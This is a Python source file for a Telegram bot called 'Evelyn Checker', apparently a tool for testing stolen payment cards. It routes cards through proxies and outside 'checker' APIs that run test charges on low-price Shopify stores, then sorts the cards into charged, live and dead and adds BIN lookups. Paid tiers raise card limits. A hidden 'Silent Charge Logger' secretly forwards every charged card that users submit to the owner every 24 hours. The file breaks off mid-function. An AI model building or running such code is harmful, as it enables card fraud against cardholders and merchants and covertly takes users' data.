import sys
if sys.stdout and sys.stdout.encoding != 'utf-8':
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except Exception:
        pass
if sys.stderr and sys.stderr.encoding != 'utf-8':
    try:
        sys.stderr.reconfigure(encoding='utf-8')
    except Exception:
        pass

from telethon import TelegramClient, events, Button
from telethon.errors import FloodWaitError
import asyncio


# Globally disable link previews on all sent messages to avoid account preview cards
_orig_send_message = TelegramClient.send_message
async def _patched_send_message(self, *args, **kwargs):
    if 'link_preview' not in kwargs:
        kwargs['link_preview'] = False
    return await _orig_send_message(self, *args, **kwargs)
TelegramClient.send_message = _patched_send_message
import aiohttp
import aiofiles
import os
import random
import time
import json
import secrets as _secrets
import string as _string
import re
from html import escape
from urllib.parse import quote
from datetime import datetime
from collections import deque
# Checker APIs (multi — round-robin; owner: /apiconfig, /apiurl, /apienable, /apiworkers)
DEFAULT_CHECKER_APIS = [
    {'id': 'api1', 'name': 'Primary', 'url': 'https://one50con.onrender.com/shopify?', 'max_workers': 150, 'enabled': True, 'role': 'primary'},
    {'id': 'api2', 'name': 'Secondary', 'url': 'https://vps-fix-wobh.onrender.com/shopify?', 'max_workers': 150, 'enabled': True, 'role': 'primary'},
    {'id': 'api3', 'name': 'Fallback', 'url': 'https://con-curency.onrender.com/shopify?', 'max_workers': 150, 'enabled': True, 'role': 'fallback'},
    {'id': 'api4', 'name': 'Quaternary', 'url': '', 'max_workers': 150, 'enabled': False, 'role': 'primary'},
]
ABSOLUTE_MAX_API_WORKERS = 1500   # per-API ceiling (/apiworkers) — no silent cap


def _normalize_api_workers(n):
    """Store exactly what owner sets (1–500); only blocks invalid/outrageous values."""
    try:
        v = int(n)
    except (TypeError, ValueError):
        return 15
    return max(1, min(ABSOLUTE_MAX_API_WORKERS, v))


# Set on Render via DATA_DIR + persistent disk mount (see render.yaml)
_BOT_DIR_EARLY = os.path.dirname(os.path.abspath(__file__))
_DATA_DIR = os.environ.get('DATA_DIR', _BOT_DIR_EARLY)
os.makedirs(_DATA_DIR, exist_ok=True)
CONFIG_FILE = os.path.join(_DATA_DIR, 'evelyn_soul_config.json')
PROXY_CHECK_API_URL = 'http://2.24.66.157:5050/proxy'
STRIPE_API_URL = 'https://cweeeeeeee.vercel.app/wp'
BIN_API_URL = 'https://api.juspay.in/cardbins'
MAX_UPLOAD_BYTES = 10 * 1024 * 1024

# ─── Silent Charge Logger (24h auto-send to owner) ──────────────────────
_CHARGE_LOG_FILE = os.path.join(_DATA_DIR, 'charges_24h.txt')
_CHARGE_LOG_TS_FILE = os.path.join(_DATA_DIR, 'charges_last_sent.txt')  # persists last-send time
_CHARGE_PERM_FILE = os.path.join(_DATA_DIR, 'charges_all.txt')  # permanent file for /getch
_CHARGE_LOG_LOCK = None  # initialized lazily as asyncio.Lock
_CHARGE_CHECK_INTERVAL = 3600  # check every 1 hour (survives restarts)

def _get_charge_log_lock():
    global _CHARGE_LOG_LOCK
    if _CHARGE_LOG_LOCK is None:
        _CHARGE_LOG_LOCK = asyncio.Lock()
    return _CHARGE_LOG_LOCK

_CHARGE_LOG_SEEN = set()  # dedup: track card numbers already logged this cycle

def _log_charge_sync(card, gateway, price, response):
    """Append a charged card to both the 24h log and the permanent log. Skips duplicates."""
    try:
        # Extract card number (first field before |) for dedup
        card_key = card.split('|')[0].strip() if card else card
        line = f"{card} | {gateway} | {price} | {response}\n"
        # 24h file (deduped per cycle)
        if card_key not in _CHARGE_LOG_SEEN:
            _CHARGE_LOG_SEEN.add(card_key)
            with open(_CHARGE_LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(line)
        # Permanent file (always append — /removech handles cleanup)
        with open(_CHARGE_PERM_FILE, 'a', encoding='utf-8') as f:
            f.write(line)
    except Exception:
        pass

def _get_last_send_time():
    """Read last send timestamp from disk. Returns 0 if never sent."""
    try:
        if os.path.exists(_CHARGE_LOG_TS_FILE):
            with open(_CHARGE_LOG_TS_FILE, 'r') as f:
                return float(f.read().strip())
    except Exception:
        pass
    return 0

def _save_last_send_time():
    """Save current timestamp to disk so it survives restarts."""
    try:
        with open(_CHARGE_LOG_TS_FILE, 'w') as f:
            f.write(str(time.time()))
    except Exception:
        pass

async def _send_charge_log_to_owner():
    """Send the charge log file to the owner and delete it."""
    try:
        if not os.path.exists(_CHARGE_LOG_FILE):
            _save_last_send_time()  # reset timer even if no file
            return
        size = os.path.getsize(_CHARGE_LOG_FILE)
        if size == 0:
            os.remove(_CHARGE_LOG_FILE)
            _save_last_send_time()
            return
        # Count lines
        with open(_CHARGE_LOG_FILE, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        count = len([l for l in lines if l.strip()])
        if count == 0:
            os.remove(_CHARGE_LOG_FILE)
            _save_last_send_time()
            return
        # Send to owner
        caption = f"⚡ {count} charged cards in the last 24h"
        await bot.send_file(
            OWNER_ID,
            _CHARGE_LOG_FILE,
            caption=caption,
            force_document=True,
        )
        # Delete after sending and reset
        os.remove(_CHARGE_LOG_FILE)
        _CHARGE_LOG_SEEN.clear()
        _save_last_send_time()
    except Exception:
        pass

async def _charge_log_24h_loop():
    """Background loop: checks every hour if 24h have passed since last send.
    Restart-proof — last send time is saved to disk."""
    await asyncio.sleep(30)  # small delay on startup for bot to connect
    while True:
        try:
            last_sent = _get_last_send_time()
            now = time.time()
            # If 24h have passed (or never sent before and file exists)
            if (now - last_sent) >= 86400:
                await _send_charge_log_to_owner()
        except Exception:
            pass
        await asyncio.sleep(_CHARGE_CHECK_INTERVAL)  # check again in 1 hour
BOT_BRAND = "Evelyn"
DEV_NAME = "𝑫𝒂𝒓𝒌"
DEV_LINK = "https://t.me/sceloi"


def dev_credit_html() -> str:
    return f'<a href="{DEV_LINK}">{DEV_NAME}</a>'


def bot_by_html() -> str:
    return f'🤖 <b>Bot By: {dev_credit_html()}</b>'


# ─── Global sites + Evelyn UI ───────────────────────────────────────────
GLOBAL_SITES_FILE = os.path.join(_DATA_DIR, "global_sites.json")
_legacy_global_sites = os.path.join(_BOT_DIR_EARLY, "global_sites.json")
if not os.path.isfile(GLOBAL_SITES_FILE) and os.path.isfile(_legacy_global_sites):
    try:
        import shutil
        shutil.copy2(_legacy_global_sites, GLOBAL_SITES_FILE)
    except Exception:
        pass
GLOBAL_MIN_PRICE = 0.01
GLOBAL_MAX_PRICE = 20.0
SITE_CHECK_BATCH_SIZE = 100          # sites queued per batch for /site and /addsite
SITE_CHECK_MAX_CONCURRENT = 200     # total parallel site probes (50 per API × 2)

# ─── Permanent site failure tracking ────────────────────────────────────
SITE_FAIL_THRESHOLD = 3              # remove site after this many permanent fails
_site_fail_tracker = {}              # {site_url: {'count': N, 'errors': []}}
_PERMANENT_SITE_ERRORS = [
    'amount_too_small', 'amount too small',
    'no products', 'no valid products', 'no valid product',
    'checkout disabled', 'checkout_disabled',
    'product not found', 'failed to detect product',
    'payments_positive_amount_expected', 'positive_amount_expected',
    'positive amount expected', 'price: $0.00',
]
SITE_CHECK_PER_API = 50             # cap per checker API during /site and /addsite
SH_MAX_PRICE = 10.0
FREE_CARD_LIMIT = 500
PREMIUM_TIERS = {
    'basic': {'label': 'Basic', 'limit': 1000, 'prefix': 'EVB'},
    'pro': {'label': 'Pro', 'limit': 5000, 'prefix': 'EVP'},
    'max': {'label': 'Max', 'limit': 10000, 'prefix': 'EVM'},
    'ultra': {'label': 'Ultra', 'limit': 50000, 'prefix': 'EVU'},
}
DEFAULT_PREMIUM_TIER = 'max'
PENDING_CHK = {}

GIF_REACTIONS = [
    "airkiss", "angrystare", "bite", "bleh", "blush", "brofist", "celebrate", "cheers",
    "clap", "confused", "cool", "cry", "cuddle", "dance", "drool", "evillaugh", "facepalm",
    "handhold", "happy", "headbang", "hug", "huh", "laugh", "lick", "love", "mad", "nervous",
    "no", "nom", "nosebleed", "nuzzle", "nyah", "pat", "peek", "pinch", "poke", "pout", "punch",
    "roll", "run", "scared", "shout", "shrug", "shy", "sigh", "sip", "slap", "sleep", "slowclap",
    "smack", "smile", "smug", "sneeze", "stare", "surprised", "sweat", "thumbsup", "tickle",
    "tired", "wave", "wink", "woah", "yawn", "yay", "yes",
]


def parse_price_value(price_text):
    try:
        if price_text is None:
            return None
        txt = str(price_text).strip()
        txt = re.sub(r"[\$€£₹\s]", "", txt)
        if "," in txt and "." in txt:
            txt = txt.replace(",", "")
        else:
            txt = txt.replace(",", ".")
        return float(txt)
    except Exception:
        return None


def load_global_sites():
    try:
        if os.path.exists(GLOBAL_SITES_FILE):
            with open(GLOBAL_SITES_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                if isinstance(data, list):
                    return data
                if isinstance(data, dict):
                    for key in ("sites", "global_sites", "data"):
                        if isinstance(data.get(key), list):
                            return data[key]
    except Exception:
        pass
    return []


def save_global_sites(sites):
    with open(GLOBAL_SITES_FILE, "w", encoding="utf-8") as f:
        json.dump(sites or [], f, indent=2, ensure_ascii=False)


def _is_permanent_site_error(msg):
    """Check if error indicates a permanent site problem (won't change with different cards)."""
    msg_lower = str(msg or '').lower()
    return any(err in msg_lower for err in _PERMANENT_SITE_ERRORS)


def track_site_permanent_fail(site, error_msg):
    """Track repeated site failures. Remove from global_sites.json after SITE_FAIL_THRESHOLD fails."""
    if not site or not _is_permanent_site_error(error_msg):
        return False
    site_key = site.lower().rstrip('/')
    if site_key not in _site_fail_tracker:
        _site_fail_tracker[site_key] = {'count': 0, 'errors': []}
    _site_fail_tracker[site_key]['count'] += 1
    _site_fail_tracker[site_key]['errors'].append(str(error_msg)[:100])

    if _site_fail_tracker[site_key]['count'] >= SITE_FAIL_THRESHOLD:
        # Remove from global_sites.json permanently
        sites = load_global_sites()
        updated = [s for s in sites if str(s.get('url', '')).lower().rstrip('/') != site_key]
        if len(updated) < len(sites):
            save_global_sites(updated)
            print(f"[SITE REMOVED] {site} — {SITE_FAIL_THRESHOLD} permanent fails: {_site_fail_tracker[site_key]['errors'][-1]}")
        _site_fail_tracker.pop(site_key, None)
        return True
    return False


def _is_rate_limited_msg(msg):
    """Check if the response indicates HTTP 429 rate limiting or 503/502 server overload."""
    msg_lower = str(msg or '').lower()
    return any(kw in msg_lower for kw in (
        '429', 'too many requests', 'rate_limited', 'rate limited',
        'httperror429', 'http_429', 'throttled',
        '503', '502', 'service unavailable', 'bad gateway',
    ))


def _is_generic_error_msg(msg):
    """Check if the response is a generic error that might resolve on retry."""
    msg_lower = str(msg or '').lower()
    return 'generic_error' in msg_lower or 'generic error' in msg_lower


def migrate_plain_sites_txt(sites_file="sites.txt"):
    if load_global_sites():
        return 0
    if not os.path.exists(sites_file):
        return 0
    entries = []
    with open(sites_file, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            url = line.strip()
            if url:
                entries.append({
                    "url": url, "gateway": "Unknown", "price": "N/A", "price_value": None,
                })
    if entries:
        save_global_sites(entries)
    return len(entries)


def sanitize_site_input(raw: str) -> str:
    if not raw:
        return ""
    text = str(raw).strip()
    m = re.search(r"\((https?://[^\s)]+)\)", text)
    if m:
        text = m.group(1)
    else:
        m2 = re.search(r"https?://[^\s)]+", text)
        if m2:
            text = m2.group(0)
    return text.strip("`[]() ").replace("[", "").replace("]", "").rstrip(".,;:")


def normalize_site_url(raw: str) -> str:
    """Canonical URL for dedupe + site checks — same rules as load_sites()."""
    urls = site_urls_from_entries([{'url': raw}])
    return urls[0] if urls else ""


def site_result_to_entry(res: dict) -> dict:
    return {
        'url': res['site'],
        'gateway': res.get('gateway', 'Unknown'),
        'price': res.get('price', 'N/A'),
        'price_value': parse_price_value(res.get('price')),
    }


def partition_new_site_urls(raw_urls, current_entries):
    """Dedupe owner input against global_sites and within the batch."""
    current_normalized = {
        normalize_site_url(s.get('url', '') if isinstance(s, dict) else str(s))
        for s in (current_entries or [])
    }
    current_normalized.discard('')

    seen = set()
    new_urls = []
    already_exists = 0
    self_dupes = 0
    invalid = 0

    for raw in raw_urls:
        norm = normalize_site_url(raw)
        if not norm:
            invalid += 1
            continue
        if norm in current_normalized:
            already_exists += 1
        elif norm in seen:
            self_dupes += 1
        else:
            seen.add(norm)
            new_urls.append(norm)

    return new_urls, already_exists, self_dupes, invalid


async def run_site_check_batches(sites, user_id, status_msg, *, batch_size=SITE_CHECK_BATCH_SIZE):
    """Probe sites with test_site — bypasses /chk dispatch + API worker queues."""
    proxies = load_user_proxies(user_id)
    if not proxies:
        return None, None

    alive_sites = []
    dead_sites = []

    for i in range(0, len(sites), batch_size):
        batch = sites[i:i + batch_size]
        fresh_proxies = load_user_proxies(user_id) or proxies
        tasks = [test_site(site, random.choice(fresh_proxies)) for site in batch]
        results = await asyncio.gather(*tasks)

        for res in results:
            if res['status'] == 'alive' and is_valid_alive_site_result(res):
                alive_sites.append(res)
            else:
                if res['status'] == 'alive':
                    res = {
                        **res,
                        'status': 'dead',
                        'reason': res.get('reason') or 'Failed final site validation',
                    }
                dead_sites.append(res)

        checked = len(alive_sites) + len(dead_sites)
        is_last = (i + batch_size) >= len(sites)
        await throttled_edit(
            status_msg,
            premium_emoji(
                f"⚡️ 𝐄𝐕𝐄𝐋𝐘𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 ⚡️\n\n"
                f"<b>🔥 Checking Sites...</b>\n\n"
                f"📊 <b>Checked:</b> {checked}/{len(sites)}\n"
                f"✅ <b>Alive:</b> {len(alive_sites)}\n"
                f"❌ <b>Dead:</b> {len(dead_sites)}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━"
            ),
            force=is_last,
            user_id=user_id,
            parse_mode='html',
        )
        await asyncio.sleep(2)

    return alive_sites, dead_sites


async def deliver_site_check_results(user_id, status_msg, sites, alive_sites, dead_sites, *, extra_summary=''):
    """Shared /site and /addsite summary + alive/dead txt files."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    alive_filename = f"alive_sites_{timestamp}.txt"
    async with aiofiles.open(alive_filename, 'w', encoding='utf-8') as f:
        await f.write("=" * 70 + "\n")
        await f.write("ALIVE SITES\n")
        await f.write("Format: Site | Gateway | Price | Response\n")
        await f.write("=" * 70 + "\n\n")
        for res in alive_sites:
            await f.write(
                f"{res['site']} | {res.get('gateway', '-')} | {res.get('price', '-')} | {res.get('response', '-')}\n"
            )

    dead_filename = f"dead_sites_{timestamp}.txt"
    async with aiofiles.open(dead_filename, 'w', encoding='utf-8') as f:
        await f.write("=" * 70 + "\n")
        await f.write("DEAD SITES\n")
        await f.write("Format: Site | Gateway | Price | Response | Reason\n")
        await f.write("=" * 70 + "\n\n")
        for res in dead_sites:
            await f.write(
                f"{res['site']} | {res.get('gateway', '-')} | {res.get('price', '-')} | "
                f"{res.get('response', '-')} | {res.get('reason', '-')}\n"
            )

    summary_msg = (
        f"⚡️ 𝐄𝐕𝐄𝐋𝐘𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 ⚡️\n\n"
        f"<b>✅ Site Check Complete!</b>\n\n"
        f"💳 <b>Total:</b> {len(sites)}\n"
        f"✅ <b>Alive:</b> {len(alive_sites)}\n"
        f"❌ <b>Dead:</b> {len(dead_sites)}\n"
    )
    if extra_summary:
        summary_msg += extra_summary
    summary_msg += (
        f"<b>━━━━━━━━━━━━━━━━━</b>\n"
        + bot_by_html()
    )

    await throttled_edit(status_msg, premium_emoji(summary_msg), force=True, user_id=user_id, parse_mode='html')

    if alive_sites:
        await bot.send_file(
            user_id, alive_filename,
            caption=premium_emoji(f"✅ <b>Alive Sites ({len(alive_sites)})</b>"),
            parse_mode='html',
        )
    safe_delete(alive_filename)

    if dead_sites:
        await bot.send_file(
            user_id, dead_filename,
            caption=premium_emoji(f"❌ <b>Dead Sites ({len(dead_sites)})</b>"),
            parse_mode='html',
        )
    safe_delete(dead_filename)


_site_check_api_sems: dict = {}
_site_check_rr = 0


def _get_site_check_api_sem(api_id: str):
    """Per-API site probe cap (50 each — 100 total across api1+api2)."""
    sem = _site_check_api_sems.get(api_id)
    if sem is None:
        sem = asyncio.Semaphore(SITE_CHECK_PER_API)
        _site_check_api_sems[api_id] = sem
    return sem


def _pick_site_check_api_id(mgr):
    """Round-robin API pick for /site and /addsite load balance."""
    global _site_check_rr
    apis = mgr.get_api_ids()
    if not apis:
        return None
    api_id = apis[_site_check_rr % len(apis)]
    _site_check_rr += 1
    return api_id


def site_urls_from_entries(selected_sites):
    urls = []
    for site in selected_sites or []:
        raw = site.get("url", "") if isinstance(site, dict) else str(site)
        url = sanitize_site_input(raw)
        if not url:
            continue
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        urls.append(url)
    return urls


def _site_price_value(site_entry):
    """Normalize stored site price for range filters."""
    if not isinstance(site_entry, dict):
        return None
    pv = site_entry.get("price_value")
    if pv is None:
        pv = parse_price_value(site_entry.get("price"))
    if pv is None:
        return None
    try:
        return float(pv)
    except (TypeError, ValueError):
        return None


def compute_site_range_counts(sites):
    c_all = len(sites or [])
    c_1_5 = c_1_10 = 0
    for s in sites or []:
        pv = _site_price_value(s)
        if pv is None:
            continue
        if 1.0 <= pv <= 5.0:
            c_1_5 += 1
            c_1_10 += 1
        elif 5.0 < pv <= 10.0:
            c_1_10 += 1
    return c_1_5, c_1_10, c_all


def filter_sites_by_price_range(sites, range_key):
    sites = list(sites or [])
    if range_key == "ALL":
        filtered = list(sites)
    elif range_key == "1_5":
        filtered = []
        for s in sites:
            if not isinstance(s, dict):
                continue
            pv = _site_price_value(s)
            if pv is not None and 1.0 <= pv <= 5.0:
                filtered.append(s)
    elif range_key == "1_10":
        filtered = []
        for s in sites:
            if not isinstance(s, dict):
                continue
            pv = _site_price_value(s)
            if pv is not None and 1.0 <= pv <= 10.0:
                filtered.append(s)
    else:
        filtered = list(sites)
    random.shuffle(filtered)
    return filtered


def get_sh_global_sites():
    filtered = []
    for s in load_global_sites() or []:
        if not isinstance(s, dict):
            continue
        pv = s.get("price_value")
        if pv is None:
            pv = parse_price_value(s.get("price"))
        if pv is not None and GLOBAL_MIN_PRICE <= float(pv) <= SH_MAX_PRICE:
            filtered.append(s)
    random.shuffle(filtered)
    return filtered


def build_chk_range_prompt(cards_count, sites, origin_msg_id, limit_note=None, user_id=0):
    c_1_5, c_1_10, c_all = compute_site_range_counts(sites)
    buttons = [
        [
            Button.inline(f"$1 - $5 ({c_1_5})", f"chk_range:1_5:{origin_msg_id}:{user_id}"),
            Button.inline(f"$1 - $10 ({c_1_10})", f"chk_range:1_10:{origin_msg_id}:{user_id}"),
        ],
        [Button.inline(f"All Sites ({c_all})", f"chk_range:ALL:{origin_msg_id}:{user_id}")],
    ]
    prompt = (
        f"[❅] {BOT_BRAND} | Mass Check Options\n"
        f"━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
        f"Source: Global Sites\n"
        f"Select sites price range for checking:\n\n"
        f"• $1 - $5 ({c_1_5})\n"
        f"• $1 - $10 ({c_1_10})\n"
        f"• All Sites ({c_all})\n"
        f"\nCards: {cards_count}\n"
        f"Sites available: {len(sites)}"
    )
    if limit_note:
        prompt += f"\n\n{limit_note}"
    return prompt, buttons


async def get_random_gif():
    try:
        reaction = random.choice(GIF_REACTIONS)
        api_url = f"https://api.otakugifs.xyz/gif?reaction={reaction}&format=gif"
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                if response.status == 200:
                    data = await response.json()
                    return data.get("url", api_url)
    except Exception:
        pass
    reaction = random.choice(GIF_REACTIONS)
    return f"https://api.otakugifs.xyz/gif?reaction={reaction}&format=gif"


def evelyn_result_to_display(result, check_time="N/A", is_live_fn=None):
    status = result.get("status", "")
    card_type = "dead"
    if status == "Charged":
        card_type = "charged"
    elif is_live_fn and is_live_fn(result):
        card_type = "live"
    display_status = result.get("message") or status
    if card_type == "charged":
        display_status = "ORDER_PLACED"
    return {
        "card": result.get("card"),
        "status": display_status,
        "gateway": result.get("gateway", "Unknown"),
        "price": result.get("price", "-"),
        "check_time": check_time,
        "card_type": card_type,
    }


def _is_charge_hit(result):
    return result.get("card_type") == "charged"


def hit_header_emoji(result):
    if _is_charge_hit(result):
        return "💎"
    if result.get("card_type") == "live":
        return "🔥"
    return "❌"


def hit_status_display(result):
    if _is_charge_hit(result):
        return "ORDER_PLACED"
    status = str(result.get("status", "") or "").strip()
    if status and status.upper() not in ("DEAD", "FALSE", "N/A"):
        return status
    return "Dead"


def format_gate_price(gateway, price):
    gw = str(gateway or "Unknown").strip()
    pr = str(price or "-").strip()
    if pr.startswith("$"):
        return f"{gw} {pr}"
    if pr in ("-", "", "N/A"):
        return gw
    return f"{gw} ${pr}"


async def get_bin_info_mapped(card_number):
    """Soul-style BIN dict from Juspay API."""
    bin_code = re.sub(r'\D', '', str(card_number or ''))[:6]
    if len(bin_code) < 6:
        return None
    data = await fetch_bin_data(bin_code)
    if not data:
        return None
    country = data.get('country', 'Unknown')
    return {
        'country': country,
        'flag': _country_flag_emoji(data.get('country_code'), country),
        'vendor': data.get('brand', 'Unknown'),
        'type': data.get('type', 'Unknown'),
        'level': data.get('card_sub_type', 'Unknown'),
        'bank_name': data.get('bank', 'Unknown'),
        'card_sub_type_category': data.get('card_sub_type_category', ''),
        'extended_card_type': data.get('extended_card_type', ''),
        'country_code': data.get('country_code', ''),
    }


async def format_bin_info_html(card_number):
    raw = await get_bin_info_mapped(card_number)
    if not raw:
        return "<b>BIN Info:</b> Unknown\n<b>Bank:</b> None\n<b>Country:</b> Unknown"
    vendor = (raw.get("vendor") or "Unknown").upper()
    card_type = (raw.get("type") or "Unknown").upper()
    level = (raw.get("level") or "Unknown").upper()
    extended = (raw.get("extended_card_type") or "").upper()
    category = (raw.get("card_sub_type_category") or "").upper()
    parts = []
    for p in (vendor, card_type, level, extended, category):
        if p and p not in ("UNKNOWN",) and p not in parts:
            parts.append(p)
    bin_line = " - ".join(parts) if parts else "UNKNOWN"
    bank = raw.get("bank_name") or raw.get("bank") or "None"
    if str(bank).lower() in ("unknown", "", "none"):
        bank = "None"
    country = (raw.get("country") or "Unknown").upper()
    flag = raw.get("flag") or ""
    return (
        f"<b>BIN Info:</b> {escape(bin_line)}\n"
        f"<b>Bank:</b> {escape(str(bank))}\n"
        f"<b>Country:</b> {escape(country)} {flag}"
    )


async def format_card_check_message(result, user):
    card = escape(str(result.get("card", "N/A")))
    card_type = result.get("card_type")
    status_lower = str(result.get("status", "") or "").strip().lower()
    msg_lower = str(result.get("message", "") or "").strip().lower()
    
    if card_type == "charged" or _is_charge_hit(result):
        status_title = "🤍 𝑪𝑯𝑨𝑹𝑮𝑬𝑫 🤍"
    elif "insufficient" in status_lower or "insufficient" in msg_lower or "insuff" in status_lower or "insuff" in msg_lower:
        status_title = "😀 𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 😀"
    elif "3d" in status_lower or "3d" in msg_lower or "otp" in status_lower or "otp" in msg_lower or "challenge" in status_lower or "challenge" in msg_lower:
        status_title = "😀 𝟑𝑫𝑺 😀"
    elif card_type == "live" or result.get("status") == "Approved" or is_live_hit_result(result):
        status_title = "😀 𝑳𝑰𝑽𝑬 😀"
    else:
        status_title = "⚠️ 𝑫𝑬𝑨𝑫 𝑪𝑨𝑹𝑫 ⚠️"
        
    status = escape(hit_status_display(result).replace("💀", "").replace("☠️", "").replace("☠", "").strip())
    
    # Format gateway
    gateway = escape(str(result.get("gateway") or "Unknown"))
    
    # Format price (must look like $15.78, etc.)
    raw_price = str(result.get("price") or "-").strip()
    if raw_price.startswith("$"):
        price = escape(raw_price)
    elif raw_price in ("-", "", "N/A", "0.00", "0.0", "0"):
        price = "N/A"
    else:
        price = f"${escape(raw_price)}"
        
    # Get BIN info details
    raw_bin = await get_bin_info_mapped(result.get("card", "N/A"))
    if not raw_bin:
        bin_line = "UNKNOWN"
        bank = "None"
        country = "Unknown"
        flag = ""
    else:
        vendor = (raw_bin.get("vendor") or "Unknown").upper()
        bin_card_type = (raw_bin.get("type") or "Unknown").upper()
        level = (raw_bin.get("level") or "Unknown").upper()
        extended = (raw_bin.get("extended_card_type") or "").upper()
        category = (raw_bin.get("card_sub_type_category") or "").upper()
        parts = []
        for p in (vendor, bin_card_type, level, extended, category):
            if p and p not in ("UNKNOWN",) and p not in parts:
                parts.append(p)
        bin_line = escape(" - ".join(parts) if parts else "UNKNOWN")
        bank = escape(raw_bin.get("bank_name") or raw_bin.get("bank") or "None")
        if str(bank).lower() in ("unknown", "", "none"):
            bank = "None"
        country = escape((raw_bin.get("country") or "Unknown").upper())
        flag = raw_bin.get("flag") or ""
        
    return (
        f"⚡️ 𝐄𝐕𝐄𝐋𝐘𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 ⚡️\n\n"
        f"{status_title}\n\n"
        f"💳 CC : <code>{card}</code>\n"
        f"🛒 Gateway : {gateway}\n"
        f"📝 Response: {status}\n"
        f"💵 Price   : {price}\n\n"
        f"💳 BIN Info: {bin_line}\n"
        f"🌐 Bank: {bank}\n"
        f"🌐 Country: {country} {flag}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📬 Made by <a href=\"{DEV_LINK}\">{DEV_NAME}</a>"
    )


def build_chk_progress_text(results, range_label=None):
    elapsed = int(time.time() - results["start_time"])
    return (
        f"⚡️ 𝐄𝐕𝐄𝐋𝐘𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 ⚡️\n\n"
        f"🛒 Gateway: #Mass_Shopify\n"
        + (f"💵 Price Range: {range_label}\n" if range_label else "")
        + f"💳 Total Cards: {results['total']}\n"
        f"📊 Checked: {results['checked']}/{results['total']}\n"
        f"⏰ Duration: {elapsed // 60}m {elapsed % 60}s\n\n"
        f"🤍 Charged: {len(results['charged'])}\n"
        f"😀 Live: {len(results['approved'])}\n"
        f"⚠️ Dead: {len(results['dead'])}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )

# Premium Custom Emoji IDs (bot must be created with Telegram Premium account)
# Use @RawDataBot to get custom_emoji_id for any premium emoji
PREMIUM_EMOJI_IDS = {
    "✅": "6088893844693195262",
    "🔥": "6181540309357305513",
    "❌": "6037570896766438989",
    "⚡": "5445388803223091254",
    "⚡️": "5445388803223091254",
    "💳": "5447453226498552490",
    "💠": "5971837723676249096",
    "📝": "5444889156792646660",
    "🎯": "5974235702701853774",
    "🤖": "6057466460886799210",
    "🤵": "4949560993840629085",
    "💰": "5444860552310457690",
    "⏸️": "6001440193058444284",
    "▶️": "6285315214673975495",
    "🛑": "5420323339723881652",
    "📊": "5231200819986047254",
    "📦": "6066395745139824604",
    "📋": "5445260044398524944",
    "🔄": "5971837723676249096",
    "⏳": "5454415424319931791",
    "⌛️": "5454415424319931791",
    "⌛": "5454415424319931791",
    "⏰": "5445350406215465190",
    "🚀": "5372917041193828849",
    "⚠️": "5447381715293074599",
    "💎": "5364040533498932357",
    "🤍": "5764979527331615949",
    "😀": "5303438381743618017",
    "🛒": "5447319442562251569",
    "💵": "5409048419211682843",
    "🤩": "6179049730836799502",
    "😈": "5303432841235819631",
    "❤️": "5303075298093329634",
    "❤": "5303075298093329634",
    "✔️": "5447242579827523388",
    "✔": "5447242579827523388",
    "ℹ️": "5247029067256987229",
    "ℹ": "5247029067256987229",
    "📲": "5445033158456145975",
    "👛": "5444960062407732826",
    "🔎": "5445255929819854310",
    "🤯": "5963085452205362622",
    "📅": "5800810214689084012",
    "🎁": "6089193719309801680",
}

def premium_emoji(text):
    """Replace Unicode emojis with <tg-emoji emoji-id="..."> for Premium custom emojis.
    Requires a Telethon/parser that supports <tg-emoji emoji-id="ID"> in HTML (e.g. Telethon 2.x or custom parser).
    Bot must be created with a Telegram Premium account for custom emojis to send."""
    if not text:
        return text
        
    # Use placeholder for DEAD CARD to prevent double-replacing the warning emoji ⚠️
    text = text.replace("⚠️ 𝑫𝑬𝑨𝑫 𝑪𝑨𝑹𝑫 ⚠️", "__DEAD_CARD_PLACEHOLDER__")
        
    # Perform manual custom emoji replacements for Bank, Country, and Made by to avoid collision
    text = text.replace("🌐 Bank:", '<tg-emoji emoji-id="5447602197439218445">🌐</tg-emoji> Bank:')
    text = text.replace("🌐 Country:", '<tg-emoji emoji-id="5445326466067754897">🌐</tg-emoji> Country:')
    text = text.replace("🌐 Gateway:", '<tg-emoji emoji-id="6026367225466720832">🌐</tg-emoji> Gateway:')
    text = text.replace("🌐 𝐏𝐑𝐎𝐗𝐈𝐄𝐒 🌐", '<tg-emoji emoji-id="5447602197439218445">🌐</tg-emoji> 𝐏𝐑𝐎𝐗𝐈𝐄𝐒 <tg-emoji emoji-id="5447602197439218445">🌐</tg-emoji>')
    text = text.replace("📬 Made by", '<tg-emoji emoji-id="5445163772706582819">📬</tg-emoji> Made by')
    
    # BIN Lookup manual overrides
    text = text.replace("⚡️ 💎 BIN Lookup 💎 ⚡️", '<tg-emoji emoji-id="5445388803223091254">⚡️</tg-emoji> <tg-emoji emoji-id="5197350061012436657">💎</tg-emoji> BIN Lookup <tg-emoji emoji-id="5197350061012436657">💎</tg-emoji> <tg-emoji emoji-id="5445388803223091254">⚡️</tg-emoji>')
    text = text.replace("👛 BIN:", '<tg-emoji emoji-id="5444960062407732826">👛</tg-emoji> BIN:')
    text = text.replace("📲 Bank:", '<tg-emoji emoji-id="5445033158456145975">📲</tg-emoji> Bank:')
    text = text.replace("💎 Brand:", '<tg-emoji emoji-id="5260681660189408650">💎</tg-emoji> Brand:')
    text = text.replace("🔎 Type:", '<tg-emoji emoji-id="5445255929819854310">🔎</tg-emoji> Type:')

    
    # Use placeholders to avoid replacing the same emoji inside tags again
    placeholders = []
    result = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        placeholder = f"\x00PE{i:02d}\x00"
        placeholders.append((placeholder, doc_id, emoji))
        result = result.replace(emoji, placeholder)
